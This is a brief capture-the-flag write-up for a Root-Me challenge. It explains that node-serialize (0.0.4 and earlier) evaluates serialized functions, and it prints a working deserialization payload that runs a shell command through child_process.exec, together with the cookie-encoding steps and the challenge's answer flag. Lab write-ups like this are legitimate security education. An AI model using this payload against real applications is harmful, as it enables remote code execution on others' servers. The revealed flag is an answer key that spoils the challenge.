## Challenge name: Node - Serialize

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/Node-Serialize](https://www.root-me.org/en/Challenges/Web-Server/Node-Serialize)

**After starting the challenge, we are presented with a login page. The cookie is base64 encoded JSON from node-serialize.**

**Node-serialize (version <= 0.0.4) deserializes functions using eval resulting in RCE.**

**RCE Payload:**
```json
{"userName":"wh04m1i","passWord":"xxx","rce":"_$$ND_FUNC$$_function() {require('child_process').exec('cat /flag.txt', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
```

**Encode: plain payload -> base64 -> URL-encode for cookie.**

**Challenge validation flag/password: `Y3pS3r0d3c0mp4nY1sB4d!`**

**Thank you.**
